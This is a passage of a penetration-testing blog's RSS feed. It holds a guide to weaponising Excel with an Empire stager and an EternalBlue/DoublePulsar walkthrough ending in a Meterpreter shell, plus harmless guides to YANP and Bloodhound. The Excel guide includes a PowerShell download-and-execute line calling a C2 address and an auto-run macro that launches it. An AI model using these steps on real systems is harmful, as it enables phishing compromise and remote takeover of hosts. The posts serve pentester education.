+<p>The ‘Slack’ configuration has also been configured so that notifications will appear in our chosen Slack channel when agents are established.</p>
+<p>Note: The agent strings were left in their default configuration, I advise these to be changed on actual engagements, as Nessus has the ability to detect Empire Listeners via the plugin id: <em>99592</em></p>
+<p><a href="https://www.tenable.com/plugins/index.php?view=single&amp;id=99592">https://www.tenable.com/plugins/index.php?view=single&amp;id=99592</a></p>
+<p><a href="/wp-content/uploads/2017/12/ks-empire1.jpg"><img src="/wp-content/uploads/2017/12/ks-empire1.jpg" alt=""></a></p>
+<p>The next part of the process is to create a stager, this is our payload we’ll use when weaponizing a MS Excel document. For this example I’m going to use the self-deleting .bat executable:</p>
+<p><em>Empire: listeners) &gt; usestager windows/launcher_bat</em></p>
+<p><em>(Empire: stager/windows/launcher_bat) &gt; set Listener http</em></p>
+<p><a href="/wp-content/uploads/2017/12/ks-empire2.jpg"><img src="/wp-content/uploads/2017/12/ks-empire2.jpg" alt=""></a></p>
+<p>By default, the payload will be written to /tmp. Serve the payload via HTTP by launching a Python HTTP Server:</p>
+<pre tabindex="0"><code>root@kali:/tmp# python -m SimpleHTTPServer
+
+Serving HTTP on 0.0.0.0 port 8000 ...
+</code></pre><p>Now it comes to weaponizing the MS Excel document, the steps in order to do this is similar to before, except the following offensive PowerShell script will be used to embed inside the ‘Comments’ property of the MS Excel document:</p>
+<p><em>PowerShell (New-Object System.Net.WebClient).DownloadFile(‘http://192.168.0.11:8000/launcher.bat’,’test.bat’);Start-Process ‘test.bat’</em></p>
+<p><strong>Note: The IP address: 192.168.0.11 is our Empire C2 server which is serving the launcher.bat payload. This will likely to be different in your environment.</strong> Upon execution, the PowerShell script will retrieve the Empire payload and execute it on the victim host.</p>
+<p>In order to embed this command into a MS Excel document within the ‘comments’ property and execute it from an embedded Macro. This can easily be done by using the PowerShell script: ‘Commentator’ (<a href="https://github.com/clr2of8/Commentator">https://github.com/clr2of8/Commentator</a>)</p>
+<p>Begin by starting PowerShell:</p>
+<pre tabindex="0"><code>powershell.exe -exec bypass
+</code></pre><p>Import the module into your PowerShell environment:</p>
+<pre tabindex="0"><code>Import-Module .\Commentator.ps1
+</code></pre><p>And execute the script to embed our payload into the ‘comments’ property of the MS Excel document:</p>
+<pre tabindex="0"><code>Invoke-Commentator -OfficeFile .\empire_posh_delivery.xlsx –CommentFile .\empire_posh_payload.txt
+</code></pre><p><strong>Note: Given the size of the PowerShell script above, this was placed within the text file: <em>empire_posh_payload.txt</em></strong> After successful execution, a copy of your existing MS Office file will be created with the payload embedded:</p>
+<p><em>The new file with added comment has been written to .\empire_posh_delivery-wlc.xlsx.</em></p>
+<p><em>DONE!</em></p>
+<p>This can be verified by inspecting the file’s metadata / properties:</p>
+<p><a href="/wp-content/uploads/2017/12/ks-empire3.jpg"><img src="/wp-content/uploads/2017/12/ks-empire3.jpg" alt=""></a></p>
+<p>Lastly, in order to execute the payload embedded within the ‘comments’ property, the following embedded Macro can be used:</p>
+<pre tabindex="0"><code>Sub Workbook_Open()
+
+Dim p As DocumentProperty
+
+
+
+ For Each p In ActiveWorkbook.BuiltinDocumentProperties
+
+    If p.Name = &#34;Comments&#34; Then
+
+        Shell (p.Value)
+
+    End If
+
+ Next
+
+End Sub
+</code></pre><p><strong>Note: In order to utilise auto-execution via the ‘<em>Workbook_Open()</em>’ function, the weaponised MS Excel document needed to be downgraded to Office 98 – 2003 compatibility (.xls)</strong> <a href="/wp-content/uploads/2017/12/ks-empire4.jpg"><img src="/wp-content/uploads/2017/12/ks-empire4.jpg" alt=""></a></p>
+<p>After the victim has clicked ‘enable editing’ and ‘enable content’, an Empire agent session should appear:</p>
+<p><a href="/wp-content/uploads/2017/12/ks-empire5.jpg"><img src="/wp-content/uploads/2017/12/ks-empire5.jpg" alt=""></a> <a href="/wp-content/uploads/2017/12/ks-empire6.jpg"><img src="/wp-content/uploads/2017/12/ks-empire6.jpg" alt=""></a></p>
+<h3 id="about-the-author">About The Author</h3>
+<ul>
+<li>
+<p><a href="/"></a></p>
+<p><a href="https://www.facebook.com/sharer.php?u=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/">**</a> <a href="http://twitter.com/share?url=https://smittix.github.io/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/&amp;text=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%202%20of%202%29">**</a> <a href="mailto:?subject=Executing%20Metasploit%20%26amp;%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20(part%202%20of%202)&amp;body=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/">**</a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://smittix.github.io/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/&amp;title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%202%20of%202%29">**</a> <a href="">**</a> <a href="https://t.me/share/url?url=https://smittix.github.io/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/&amp;title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%202%20of%202%29">**</a> <a href="https://api.whatsapp.com/send?text=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/&amp;title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%202%20of%202%29">**</a> <a href="https://www.reddit.com/submit?url=https://smittix.github.io/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/&amp;title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%202%20of%202%29">**</a> <a href="">**</a></p>
+</li>
+</ul>
+<h2 id="post-navigation">Post navigation</h2>
+<p><a href="/posts/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/">Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 1 of 2)</a><a href="/posts/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/">Efficient Time Based Blind SQL Injection using MySQL Bit Functions and Operators</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Reporting SSL/TLS Issues the Easy Way with YANP</title>
+            <link>https://smittix.github.io/posts/reporting-ssl/tls-issues-the-easy-way-with-yanp/</link>
+            <pubDate>Thu, 12 Oct 2017 00:00:00 +0000</pubDate>
+            
+            <guid>https://smittix.github.io/posts/reporting-ssl/tls-issues-the-easy-way-with-yanp/</guid>
+            <description>&lt;p&gt;What’s YANP I hear you ask? &lt;a href=&#34;https://github.com/adipinto/yet-another-nessus-parser&#34;&gt;YANP&lt;/a&gt; stands for “Yet Another Nessus Parser” written by &lt;a href=&#34;https://twitter.com/adipinto&#34;&gt;Alessandro Di Pinto&lt;/a&gt; and I’m over the moon that I found it. I’ll tell you why.&lt;/p&gt;
+&lt;p&gt;Getting all the IP addresses and ports together from Nessus to stick them into other tools such as TestSSL.sh or SSLScan can take away valuable time on large engagements when the time could be spent looking into more harder to detect vulnerabilities. Ultimately we have a duty to our clients to report all our findings and it’s just another thing that needs to be done.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<p>What’s YANP I hear you ask? <a href="https://github.com/adipinto/yet-another-nessus-parser">YANP</a> stands for “Yet Another Nessus Parser” written by <a href="https://twitter.com/adipinto">Alessandro Di Pinto</a> and I’m over the moon that I found it. I’ll tell you why.</p>
+<p>Getting all the IP addresses and ports together from Nessus to stick them into other tools such as TestSSL.sh or SSLScan can take away valuable time on large engagements when the time could be spent looking into more harder to detect vulnerabilities. Ultimately we have a duty to our clients to report all our findings and it’s just another thing that needs to be done.</p>
+<p>But.. Just because it needs to be done doesn’t mean we can’t get it done quicker and that’s where <a href="https://github.com/adipinto/yet-another-nessus-parser">YANP</a> comes into play.</p>
+<h2 id="what-is-yanp">What is YANP?</h2>
+<p>The below is taken from the projects GitHub page.</p>
+<blockquote>
+</blockquote>
+<p>Yet Another Nessus Parser (<a href="https://github.com/adipinto/yet-another-nessus-parser">YANP</a>) is a parser able to extract information from Tenable Nessus’s .nessus file format. The main tool’s objective is to export vulnerability assessment reports in a parsable way. The user is able to choose an appropriate output format in order to save the Nessus’ reports following various advanced needs.</p>
+<p>Here I will show you my flow of getting the SSL/TLS issues pulled out of Nessus easily and quickly , I’m writing this to help anyone who finds it time-consuming too. By all means if anyone out there reading this has a better way of doing things please let me know, your comments will be much appreciated.</p>
+<h2 id="installing-yanp">Installing YANP</h2>
+<p>Any tools I get from GitHub I stick in my /home/james/tools directory. Let’s git clone YANP to our local system please change the path to a directory of your choosing.</p>
+<h6 id="these-steps-were-taken-on-a-kali-linux-virtual-machine-and-assumes-you-have-both-git-and-python-installed">These steps were taken on a kali-linux virtual machine and assumes you have both git and python installed.</h6>
+<pre tabindex="0"><code>cd /home/james/tools
+</code></pre><pre tabindex="0"><code>git clone https://github.com/adipinto/yet-another-nessus-parser
+</code></pre><p><a href="/wp-content/uploads/2017/10/Screenshot-from-2017-10-12-14-50-17.png"><img src="/wp-content/uploads/2017/10/Screenshot-from-2017-10-12-14-50-17.png" alt=""></a></p>
+<pre tabindex="0"><code>cd yet-another-nessus-parser
+</code></pre><p>OK so we’ve cloned the repository and we’re now sitting in the YANP directory.</p>
+<h2 id="parsing-for-use-with-other-tools">Parsing for Use with Other Tools</h2>
+<p>Now it’s time to parse your .nessus file to gain the information we need. As you know, this tutorial is aimed at SSL/TLS issues but you can parse the file for any issues of your choosing.</p>
+<p>Let’s have a look the options first.</p>
+<pre tabindex="0"><code>python yanp.py
+</code></pre><p><a href="/wp-content/uploads/2017/10/Screenshot-from-2017-10-12-16-32-52.png"><img src="/wp-content/uploads/2017/10/Screenshot-from-2017-10-12-16-32-52.png" alt=""></a></p>
+<p>As you can see there are a few options that we can use, we can search using the specific PluginID or PluginName for example. In this instance I’m going to search for “SSL” using the PluginName option using the “-d” switch. We’re also going to tell YANP where our .nessus file is using the “-i” switch.</p>
+<pre tabindex="0"><code>python yanp.py -i /home/james/Downloads/sample.nessus -d SSL
+</code></pre><p>You should see some output similar to mine below.</p>
+<p><a href="/wp-content/uploads/2017/10/Screenshot-from-2017-10-12-15-43-59.png"><img src="/wp-content/uploads/2017/10/Screenshot-from-2017-10-12-15-43-59.png" alt=""></a></p>
+<p>That’s all good and well but we can’t use that for anything except viewing it really. Let’s clean it up a little by piping it to “cut”. You will see I have set the delimiter to a space (-d ” “) and chosen the first field (-f 1) to grab just the list of IP addresses and ports.</p>
+<pre tabindex="0"><code>python yanp.py -i /home/james/Downloads/sample.nessus -d SSL | cut -d &#34; &#34; -f 1
+</code></pre><p><a href="/wp-content/uploads/2017/10/Screenshot-from-2017-10-12-15-48-01.png"><img src="/wp-content/uploads/2017/10/Screenshot-from-2017-10-12-15-48-01.png" alt=""></a></p>
+<p>That’s a little better but I see there are duplicates in there too. Let’s use “sort” and “uniq” to remove the duplicated entries.</p>
+<pre tabindex="0"><code>python yanp.py -i /home/james/Downloads/sample.nessus -d SSL |cut -d &#34; &#34; -f 1| sort | uniq
+</code></pre><p><a href="/wp-content/uploads/2017/10/Screenshot-from-2017-10-12-16-38-37.png"><img src="/wp-content/uploads/2017/10/Screenshot-from-2017-10-12-16-38-37.png" alt=""></a></p>
+<p>That looks a lot better and we now have usable list that we can pass to other tools for analysis but first let’s transfer this data into a file.</p>
+<pre tabindex="0"><code>python yanp.py -i /home/james/Downloads/sample.nessus -d SSL | cut -d &#34; &#34; -f 1 | sort | uniq &gt; ssl-issues.txt
+</code></pre><p>You can now use your newly created ssl-issues.txt file as the target list for other tools such as SSLScan. Again, you can search for anything via the PluginName or PluginID switches and output whatever you need.</p>
+<h2 id="parsing-for-specific-issues">Parsing for Specific Issues</h2>
+<p>You should now get the gist of what YANP can do and you’re probably coming up with your own ideas of how to use it. For this next example we will search for a specific SSL issue such as “BEAST” , we will get the affected host details for later use in our report.</p>
+<pre tabindex="0"><code>python yanp.py -i /home/james/Downloads/sample.nessus -d BEAST
+</code></pre><p><a href="/wp-content/uploads/2017/10/Screenshot-from-2017-10-12-16-39-02.png"><img src="/wp-content/uploads/2017/10/Screenshot-from-2017-10-12-16-39-02.png" alt=""></a></p>
+<p>You now see a list that we can use for our report which tells the client the IP, Port and Issue.</p>
+<h2></h2>
+<h2 id="parsing-to-csv">Parsing to CSV</h2>
+<p>We can also parse the .nessus file and create a CSV for later manipulation using the following command which will create the file “issues.csv”.</p>
+<pre tabindex="0"><code>python yanp.py -i /home/james/Downloads/sample.nessus --csv issues
+</code></pre><p><a href="/wp-content/uploads/2017/10/Screenshot-from-2017-10-12-16-25-10.png"><img src="/wp-content/uploads/2017/10/Screenshot-from-2017-10-12-16-25-10.png" alt=""></a></p>
+<p>Well, that’s it for this post. Learning this saved me a heap of time on client sites. There is more than likely better ways to do this but this suited me at the time and thought it could help somebody else facing the same issues.</p>
+<p>As always please feel free to contact me I’d love to hear better ways of doing things. We’re all here to learn right?</p>
+<p>Special thanks to <a href="https://twitter.com/adipinto?lang=en">Allesandro Di Pinto</a> for <a href="https://github.com/adipinto/yet-another-nessus-parser">YANP</a>.</p>
+<h3 id="about-the-author">About The Author</h3>
+<ul>
+<li>
+<p><a href="/"></a></p>
+<p><a href="https://www.facebook.com/sharer.php?u=/reporting-ssltls-issues-the-easy-way-with-yanp/">**</a> <a href="http://twitter.com/share?url=https://smittix.github.io/reporting-ssltls-issues-the-easy-way-with-yanp/&amp;text=Reporting%20SSL%2FTLS%20Issues%20the%20Easy%20Way%20with%20YANP">**</a> <a href="mailto:?subject=Reporting%20SSL/TLS%20Issues%20the%20Easy%20Way%20with%20YANP&amp;body=/reporting-ssltls-issues-the-easy-way-with-yanp/">**</a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://smittix.github.io/reporting-ssltls-issues-the-easy-way-with-yanp/&amp;title=Reporting%20SSL%2FTLS%20Issues%20the%20Easy%20Way%20with%20YANP">**</a> <a href="">**</a> <a href="https://t.me/share/url?url=https://smittix.github.io/reporting-ssltls-issues-the-easy-way-with-yanp/&amp;title=Reporting%20SSL%2FTLS%20Issues%20the%20Easy%20Way%20with%20YANP">**</a> <a href="https://api.whatsapp.com/send?text=/reporting-ssltls-issues-the-easy-way-with-yanp/&amp;title=Reporting%20SSL%2FTLS%20Issues%20the%20Easy%20Way%20with%20YANP">**</a> <a href="https://www.reddit.com/submit?url=https://smittix.github.io/reporting-ssltls-issues-the-easy-way-with-yanp/&amp;title=Reporting%20SSL%2FTLS%20Issues%20the%20Easy%20Way%20with%20YANP">**</a> <a href="">**</a></p>
+</li>
+</ul>
+<h2 id="post-navigation">Post navigation</h2>
+<p><a href="/posts/quick-guide-to-installing-bloodhound-in-kali-rolling/">Quick Guide to Installing Bloodhound in Kali-Rolling</a><a href="/posts/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/">Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 1 of 2)</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Quick Guide to Installing Bloodhound in Kali-Rolling</title>
+            <link>https://smittix.github.io/posts/quick-guide-to-installing-bloodhound-in-kali-rolling/</link>
+            <pubDate>Wed, 11 Oct 2017 00:00:00 +0000</pubDate>
+            
+            <guid>https://smittix.github.io/posts/quick-guide-to-installing-bloodhound-in-kali-rolling/</guid>
+            <description>&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
+&lt;p&gt;I have had a few people over the last couple of months asking me how to get &lt;a href=&#34;https://github.com/BloodHoundAD/Bloodhound/wiki&#34;&gt;Bloodhound&lt;/a&gt; up and running after I had sung its praise since seeing the “Six Degrees to Domain Admin” video from BSIDES Las Vegas. If you still haven’t seen the video I am referring to I suggest you take a peek before proceeding.&lt;/p&gt;
+&lt;p&gt;[su_youtube url=”https://www.youtube.com/watch?v=lxd2rerVsLo”]&lt;/p&gt;
+&lt;p&gt;It really is such an awesome tool and I highly recommend it to not only info-sec professionals but to anyone who administrates an Active Directory environment.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="intro">Intro</h2>
+<p>I have had a few people over the last couple of months asking me how to get <a href="https://github.com/BloodHoundAD/Bloodhound/wiki">Bloodhound</a> up and running after I had sung its praise since seeing the “Six Degrees to Domain Admin” video from BSIDES Las Vegas. If you still haven’t seen the video I am referring to I suggest you take a peek before proceeding.</p>
+<p>[su_youtube url=”https://www.youtube.com/watch?v=lxd2rerVsLo”]</p>
+<p>It really is such an awesome tool and I highly recommend it to not only info-sec professionals but to anyone who administrates an Active Directory environment.</p>
+<p>The awesome news is that <a href="https://github.com/BloodHoundAD/Bloodhound/wiki">Bloodhound</a> is now in the Kali Linux repository’s and is super easy to install and get up and running and I will show you how.</p>
+<h2 id="ensure-an-up-to-date-system">Ensure an up-to-date system.</h2>
+<p>Firstly, please ensure you’re running the latest and greatest by performing a dist-upgrade like so.</p>
+<pre tabindex="0"><code>apt-get update
+</code></pre><p>and then</p>
+<pre tabindex="0"><code>apt-get dist-upgrade
+</code></pre><h2 id="installing-bloodhound">Installing Bloodhound</h2>
+<p>You guessed it, simply run the following. Bloodhound depends on neo4j so that will be installed as well.</p>
+<pre tabindex="0"><code>apt-get install bloodhound
+</code></pre><p><a href="/wp-content/uploads/2017/10/Screenshot-from-2017-10-11-11-38-14.png"><img src="/wp-content/uploads/2017/10/Screenshot-from-2017-10-11-11-38-14.png" alt=""></a></p>
+<h2 id="change-the-default-password-for-neo4j">Change the Default Password for Neo4j</h2>
+<p>We really should change the default password for Neo4j, you know.. For reasons.</p>
+<p>Let’s launch Neo4j</p>
+<pre tabindex="0"><code>neo4j console
+</code></pre><p><a href="/wp-content/uploads/2017/10/Screenshot-from-2017-10-11-12-24-41.png"><img src="/wp-content/uploads/2017/10/Screenshot-from-2017-10-11-12-24-41.png" alt=""></a></p>
+<p>We now have a remote interface available at <strong>http://localhost:7474</strong>. Let’s head over there via a browser and change that default password. You will also see that it enabled Bolt on the localhost, we need this for later.</p>
+<p><a href="/wp-content/uploads/2017/10/Screenshot-from-2017-10-11-12-25-13.png"><img src="/wp-content/uploads/2017/10/Screenshot-from-2017-10-11-12-25-13.png" alt=""></a></p>
+<p>Login with the default credentials (below) you will then be asked to change the password :-</p>
+<ul>
+<li>Username: <strong>neo4j</strong> - Password: <strong>neo4j</strong> <a href="/wp-content/uploads/2017/10/Screenshot-from-2017-10-11-12-25-27.png"><img src="/wp-content/uploads/2017/10/Screenshot-from-2017-10-11-12-25-27.png" alt=""></a></li>
+</ul>
+<p>Go ahead and complete the password change and close the browser window.</p>
+<h2 id="let-the-hound-see-the-blood">Let the Hound See The Blood</h2>
+<p>Pop a new terminal window open and run the following command to launch Bloodhound, leave the Neo4j console running for obvious reasons.</p>
+<pre tabindex="0"><code>bloodhound
+</code></pre><p><a href="/wp-content/uploads/2017/10/Screenshot-from-2017-10-11-12-26-43.png"><img src="/wp-content/uploads/2017/10/Screenshot-from-2017-10-11-12-26-43.png" alt=""></a></p>
+<p>As you can see, Bloodhound is now running and waiting for some user input. Earlier when launching Neo4j it also enabled Bolt on bolt://127.0.0.1:7687. You need to use this as your Database URL.</p>
+<ul>
+<li>Database URL – <strong>bolt://127.0.0.1:7687</strong> - Username – <strong>neo4j</strong> - Password – <strong>your newly changed password</strong> Hit login and you should be presented with the Bloodhound tool minus any data. You can now import your data and get analyzing.</li>
+</ul>
+<p><a href="/wp-content/uploads/2017/10/Screenshot-from-2017-10-11-12-27-17.png"><img src="/wp-content/uploads/2017/10/Screenshot-from-2017-10-11-12-27-17.png" alt=""></a></p>
+<p>Hopefully this was a nice and quick guide to help anyone out there having any issues getting up and running with the awesome tool that is Bloodhound.</p>
+<p>I also want to take a moment to thank <a href="https://www.twitter.com/_wald0">@_wald0</a>, <a href="https://twitter.com/CptJesus">@CptJesus</a>, and <a href="https://twitter.com/harmj0y">@harmj0y</a>for their continued hard work on this amazing project.</p>
+<p>Cheers Guys!</p>
+<p><a href="https://github.com/BloodHoundAD/Bloodhound/wiki"><img src="/wp-content/uploads/2017/10/Bloodhound-Dogs-300x169.jpg" alt=""></a></p>
+<h3 id="about-the-author">About The Author</h3>
+<ul>
+<li>
+<p><a href="/"></a></p>
+<p><a href="https://www.facebook.com/sharer.php?u=/quick-guide-to-installing-bloodhound-in-kali-rolling/">**</a> <a href="http://twitter.com/share?url=https://smittix.github.io/quick-guide-to-installing-bloodhound-in-kali-rolling/&amp;text=Quick%20Guide%20to%20Installing%20Bloodhound%20in%20Kali-Rolling">**</a> <a href="mailto:?subject=Quick%20Guide%20to%20Installing%20Bloodhound%20in%20Kali-Rolling&amp;body=/quick-guide-to-installing-bloodhound-in-kali-rolling/">**</a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://smittix.github.io/quick-guide-to-installing-bloodhound-in-kali-rolling/&amp;title=Quick%20Guide%20to%20Installing%20Bloodhound%20in%20Kali-Rolling">**</a> <a href="">**</a> <a href="https://t.me/share/url?url=https://smittix.github.io/quick-guide-to-installing-bloodhound-in-kali-rolling/&amp;title=Quick%20Guide%20to%20Installing%20Bloodhound%20in%20Kali-Rolling">**</a> <a href="https://api.whatsapp.com/send?text=/quick-guide-to-installing-bloodhound-in-kali-rolling/&amp;title=Quick%20Guide%20to%20Installing%20Bloodhound%20in%20Kali-Rolling">**</a> <a href="https://www.reddit.com/submit?url=https://smittix.github.io/quick-guide-to-installing-bloodhound-in-kali-rolling/&amp;title=Quick%20Guide%20to%20Installing%20Bloodhound%20in%20Kali-Rolling">**</a> <a href="">**</a></p>
+</li>
+</ul>
+<h2 id="post-navigation">Post navigation</h2>
+<p><a href="/posts/exploiting-ms17-010-using-eternalblue-and-doublepulsar-to-gain-a-remote-meterpreter-shell/">Exploiting MS17-010 – Using EternalBlue and DoublePulsar to gain a remote Meterpreter shell</a><a href="/posts/reporting-ssltls-issues-the-easy-way-with-yanp/">Reporting SSL/TLS Issues the Easy Way with YANP</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Exploiting MS17-010 – Using EternalBlue and DoublePulsar to gain a remote Meterpreter shell</title>
+            <link>https://smittix.github.io/posts/exploiting-ms17-010-using-eternalblue-and-doublepulsar-to-gain-a-remote-meterpreter-shell/</link>
+            <pubDate>Tue, 09 May 2017 00:00:00 +0000</pubDate>
+            
+            <guid>https://smittix.github.io/posts/exploiting-ms17-010-using-eternalblue-and-doublepulsar-to-gain-a-remote-meterpreter-shell/</guid>
+            <description>&lt;p&gt;[su_heading align=”left”]This walk through assumes you know a thing or two and won’t go into major detail. After all it’s meant for fellow researchers and penetration testers.[/su_heading]&lt;/p&gt;
+&lt;h2 id=&#34;findings-so-far&#34;&gt;Findings so far…&lt;/h2&gt;
+&lt;p&gt;Findings from using these tools are the following so far&lt;/p&gt;
+&lt;p&gt;[su_note]The default process that Doublepulsar injects into is ‘lsass’ It was observed that whilst testing against Windows 2008 R2 SP1 that this caused the ‘lsass’ process to become unstable over time and resulting in some cases in a BSOD.[/su_note]&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<p>[su_heading align=”left”]This walk through assumes you know a thing or two and won’t go into major detail. After all it’s meant for fellow researchers and penetration testers.[/su_heading]</p>
+<h2 id="findings-so-far">Findings so far…</h2>
+<p>Findings from using these tools are the following so far</p>
+<p>[su_note]The default process that Doublepulsar injects into is ‘lsass’ It was observed that whilst testing against Windows 2008 R2 SP1 that this caused the ‘lsass’ process to become unstable over time and resulting in some cases in a BSOD.[/su_note]</p>
+<ul>
+<li>No domain is needed for the tools to work.</li>
+<li>An active user session is also not needed.</li>
+</ul>
+<h2 id="fuzzbunch-setup">Fuzzbunch setup</h2>
+<p>Firstly we need to setup our environment for the ShadowBroker tools to run in.</p>
+<p>In my case I created a Windows 7 VM for the task.</p>
+<p>Prerequisites for this exercise are</p>
+<ul>
+<li>A Windows XP/7 VM</li>
+<li><a href="https://www.python.org/download/releases/2.6/">Python 2.6</a></li>
+<li><a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/">Pywin32 Version 2.12</a></li>
+<li><a href="https://github.com/misterch0c/shadowbroker">ShadowBroker Dump</a></li>
+</ul>
+<p>Once your environment is setup and you have downloaded the ShadowBroker archive, unzip it to a path of your choice.</p>
+<p>In this instance I chose the root of the C: drive.</p>
+<p>We then need to edit a few of the files to work with our environment as on first run you will receive various error messages.</p>
+<p>Firstly we need to edit the “fb.py” file located in the /windows folder and comment out the line below.</p>
+<p><a href="/wp-content/uploads/2017/05/fb-py-edit.png"><img src="/wp-content/uploads/2017/05/fb-py-edit.png" alt=""></a></p>
+<p>Save the file and open up “Fuzzbunch.xml” you now need to change the “ResourcesDir” and “LogDir” path to match that of your environment.</p>
+<p>Note: If there is no log directory then please create it and add the path.</p>
+<p><a href="/wp-content/uploads/2017/05/fuzzbunchxml-edit.png"><img src="/wp-content/uploads/2017/05/fuzzbunchxml-edit.png" alt=""></a></p>
+<p>We should now be ready to run the Fuzzbunch tool.</p>
+<p>Launch a command prompt and navigate to the /windows folder inside the ShadowBrokers folder.</p>
+<p>Type the below command and hit return.</p>
+<pre tabindex="0"><code>fb.py
+</code></pre><p>FuzzBunch should now be running in your command prompt like the below screen shot.</p>
+<p><a href="/wp-content/uploads/2017/05/fuzzbunch-loa.png"><img src="/wp-content/uploads/2017/05/fuzzbunch-loa.png" alt=""></a></p>
+<h4></h4>
+<h2 id="listener-and-payload">Listener and Payload</h2>
+<p>Now, we need to setup our Linux attack box. For the purpose of this post I’ll be using a Kali rolling VM with Metasploit installed.</p>
+<p>Let’s go ahead and launch Metasploit, create a DLL payload and listener.</p>
+<p>The target I am attacking is a x64 Windows Server 2008 R2 system. So I setup the following payload and saved it as shown in the screen shot below.</p>
+<p><a href="/wp-content/uploads/2017/05/ddl-creation.png"><img src="/wp-content/uploads/2017/05/ddl-creation.png" alt=""></a></p>
+<p>Now for the handler a x64 reverse tcp meterpreter.</p>
+<p><a href="/wp-content/uploads/2017/05/handler.png"><img src="/wp-content/uploads/2017/05/handler.png" alt=""></a></p>
+<p>We’ll run the handler and move on to the next step.</p>
+<p><a href="/wp-content/uploads/2017/05/handler-run.png"><img src="/wp-content/uploads/2017/05/handler-run.png" alt=""></a></p>
+<p>OK, the payload you created needs copying over to the virtual machine where FuzzBunch is sitting and waiting.</p>
+<h2 id="back-to-fuzzbunch">Back to Fuzzbunch</h2>
+<p>Let’s return to our Windows VM.</p>
+<p>We can now start entering our details into the FuzzBunch tool.</p>
+<p>For most settings we can accept the defaults, the ones that we do need to change are below.</p>
+<pre tabindex="0"><code>[?] Default Target IP Address [] : Your Target&#39;s IP
+[?] Default Callback IP Address [] : Your VM&#39;s IP
+[?] Use Redirection [yes] : NO
+[?] Base Log directory [c:\logs] : Input your log path
+Index     Project
+-----     -------
+0         Create a New Project
+[?] Project [0] : 0
+[?] New Project Name : Give your project a name
+</code></pre><p>Now our initial variables are set you should now be at the fb prompt.</p>
+<h2 id="launching-the-exploit-plugin">Launching the exploit plugin</h2>
+<p>Launch the EternalBlue module.</p>
+<pre tabindex="0"><code>use eternalblue
+</code></pre><p>Again, we can accept all defaults except the below.</p>
+<pre tabindex="0"><code>[*]  Mode :: Delivery mechanism
+
+    0) DANE     Forward deployment via DARINGNEOPHYTE
+   *1) FB       Traditional deployment from within FUZZBUNCH
+
+[?] Mode [0] : 1
+</code></pre><p>Change the above from it’s default setting of “0” to “1”, you can then execute the exploit, (Some details from my test have been redacted for security).</p>
+<p><a href="/wp-content/uploads/2017/05/eternalblue-succeed.png"><img src="/wp-content/uploads/2017/05/eternalblue-succeed.png" alt=""></a></p>
+<h2 id="injecting-our-dll-payload">Injecting our DLL payload</h2>
+<p>Now the tool has created the backdoor onto the vulnerable system we can now move on to running DoublePulsar which will inject our DLL payload.</p>
+<pre tabindex="0"><code>use doublepulsar
+</code></pre><p>Once again we can accept most of the defaults, just change the variables below.</p>
+<pre tabindex="0"><code>[*]  Architecture :: Architecture of the target OS
+
+    0) x86     x86 32-bits
+   *1) x64     x64 64-bits
+</code></pre><p>The above setting defaults to x86 and will need changing to x64.</p>
+<pre tabindex="0"><code>[+] Set Architecture =&gt; x64
+
+[*]  Function :: Operation for backdoor to perform
+
+   *0) OutputInstall     Only output the install shellcode to a binary file on diskisk.
+    1) Ping              Test for presence of backdoor
+    2) RunDLL            Use an APC to inject a DLL into a user mode process.
+    3) RunShellcode      Run raw shellcode
+    4) Uninstall         Remove&#39;s backdoor from system
+
+[?] Function [0] :
+</code></pre><p>We need to select option “2” so that we can use our newly created DLL payload.</p>
+<p>Next we need to enter the path to our DLL file</p>
+<pre tabindex="0"><code>[*]  DllPayload :: DLL to inject into user mode
+
+[?] DllPayload [] : PathToOurDLL
+</code></pre><p>All other variables can be left at their default value and you can proceed to execute the plugin.</p>
+<p><a href="/wp-content/uploads/2017/05/dbl_pulsar_succeed.png"><img src="/wp-content/uploads/2017/05/dbl_pulsar_succeed.png" alt=""></a></p>
+<h2 id="hack-all-the-things">Hack all the things!</h2>
+<p>If everything has been successful you should should now have a Meterpreter shell waiting on your attack box.</p>
+<p><a href="/wp-content/uploads/2017/05/meter_session.png"><img src="/wp-content/uploads/2017/05/meter_session.png" alt=""></a></p>
+<p>[su_note]If you don’t have a shell yet then something has obviously gone wrong, check your steps and leave a comment and I will try and help you through it.[/su_note]</p>
+<h3 id="about-the-author">About The Author</h3>
+<ul>
+<li>
+<p><a href="/"></a></p>
